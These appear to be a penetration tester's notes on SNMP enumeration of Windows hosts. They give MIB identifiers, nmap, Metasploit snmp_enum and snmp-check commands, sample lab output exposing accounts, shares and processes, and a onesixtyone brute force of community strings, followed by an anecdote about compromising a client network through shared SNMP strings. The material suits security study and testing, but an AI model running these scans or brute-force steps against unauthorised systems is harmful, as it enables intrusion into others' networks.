## windows snmp MIB values corresponding to specific MS Windows SNMP paramteres

| MIB | Parameter |
| --- | --- |
| 1.3.6.1.2.1.25.1.6.0 | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name |
| 1.3.6.1.4.1.77.1.2.25 | User Accounts |
| 1.3.6.1.2.1.6.13.1.3 | TCP Local Ports |

## scanning for SNMP using nmap
```bash
nmap -sU --open -p 161 10.10.10.0/24 -oG open-snmp.txt
```

## Enumeration Tools: Metasploit module (AWESOME)
```
use auxiliary/scanner/snmp/snmp_enum
msf auxiliary(scanner/snmp/snmp_enum) > set rhosts <SNMP_HOST_IP> 
msf auxiliary(scanner/snmp/snmp_enum) > set community <COMMUNITY_STRING>
msf auxiliary(scanner/snmp/snmp_enum) > run
```
### sample output:
```
[*] User accounts:
["DA"]
["john"]
["Guest"]
["krbtgt"]
["FSAdmin"]
["NewUser"]
["Regular"]
["SysAdmin"]
["JohnSmith"]
["Administrator"]
["DefaultAccount"]

[*] TCP connections and listening ports:
Local address       Local port          Remote address      Remote port         State
0.0.0.0             80                  0.0.0.0             0                   listen
0.0.0.0             88                  0.0.0.0             0                   listen
0.0.0.0             135                 0.0.0.0             0                   listen
0.0.0.0             389                 0.0.0.0             0                   listen
0.0.0.0             443                 0.0.0.0             0                   listen
0.0.0.0             445                 0.0.0.0             0                   listen
0.0.0.0             464                 0.0.0.0             0                   listen
0.0.0.0             593                 0.0.0.0             0                   listen
0.0.0.0             636                 0.0.0.0             0                   listen
0.0.0.0             3268                0.0.0.0             0                   listen
0.0.0.0             3269                0.0.0.0             0                   listen
0.0.0.0             5985                0.0.0.0             0                   listen
0.0.0.0             49726               0.0.0.0             0                   listen
20.20.20.100        53                  0.0.0.0             0                   listen
20.20.20.100        139                 0.0.0.0             0                   listen
20.20.20.100        389                 20.20.20.100        49692               established
20.20.20.100        49692               20.20.20.100        389                 established
127.0.0.1           53                  0.0.0.0             0                   listen

[*] Share:
 Name                         : SYSVOL
  Path                        : C:\Windows\SYSVOL\sysvol
  Comment                     : Logon server share
 Name                         : NETLOGON
  Path                        : C:\Windows\SYSVOL\sysvol\LAB.local\SCRIPTS
  Comment                     : Logon server share
 Name                         : TestShare
  Path                        : C:\Users\Administrator\Desktop\TestShare
  Comment                     : This Share is for testing

[*] Software components:
Index               Name
1                   VMware Tools
2                   Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913
3                   Local Administrator Password Solution
4                   Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913
5                   Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.299
6                   Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913
7                   Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913
8                   Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.299

[*] Processes:
Id                  Status              Name                Path                Parameters
1016                running             svchost.exe         C:\Windows\system32\-k LocalService
1044                running             svchost.exe         C:\Windows\system32\-k LocalServiceNoNetwork
1060                running             svchost.exe         C:\Windows\system32\-k NetworkService
1220                running             svchost.exe         C:\Windows\system32\-k GPSvcGroup
1400                running             svchost.exe         C:\Windows\system32\-k LocalServiceNetworkRestricted
1532                running             RuntimeBroker.exe   C:\Windows\System32\-Embedding
1580                running             svchost.exe         C:\Windows\system32\-k NetworkServiceNetworkRestricted
1732                running             wsmprovhost.exe     C:\Windows\system32\-Embedding
1928                running             svchost.exe         C:\Windows\System32\-k smbsvcs
2000                running             WmiPrvSE.exe        C:\Windows\system32\wbem\
2120                running             spoolsv.exe         C:\Windows\System32\
```


## Enumeration Tools: snmp-check
```bash
# install perl dependency first
apt-get install perl-tk
snmp-check <SNMP_HOST_IP> -p 161 -c <COMMUNITY_STRING>
```


## attack: bruteforcing the community strings (common values: "public", "private", "manager") using `onesixtyone`
```bash
echo public > community_strings.txt
echo private >> community_strings.txt
echo manager >> community_strings.txt
onesixtyone -c community_strings.txt -i <SNMP_HOST_IP_LIST>
```
### sample output: this means that one of the entries in the `community_strings.txt` file we provided has worked ("public")
```
Scanning 51 hosts, 4 communities
20.20.20.100 [public] Hardware: AMD64 Family 25 Model 33 Stepping 0 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 14393 Multiprocessor Free)
```

## SNMP Pentest story
*Several years ago,*

we performed an internal penetration test on a company that provided **network integration services** to a **large number of corporate clients, banks, and other similar organizations.**

*After several hours of scoping out the system,*

we discovered **a large class B network** with **thousands of attached Cisco routers.**

It was explained to us that **each of these routers was a gateway to one of their clients**, used for **management and configuration purposes.**

A **quick scan for default cisco / cisco telnet credentials** discovered a **single low-end Cisco ADSL router.**

**Digging a bit further** revealed **a set of complex SNMP public and private community strings in the router configuration file.**

*As it turned out,*

these **same public and private community strings were used on every single networking device, for the whole class B range, and beyond**

**simple management**, *right?*

An interesting thing about enterprise routing hardware is that **these devices often support configuration file read and write through private SNMP community string access.**

*Since the private community strings for all the gateway routers were now known to us,*

*by writing a simple script to copy all the router configurations on that network using SNMP and TFTP protocols,*

we not only **compromised the infrastructure of the entire network integration company,**

**but the infrastructure of their clients, as well!**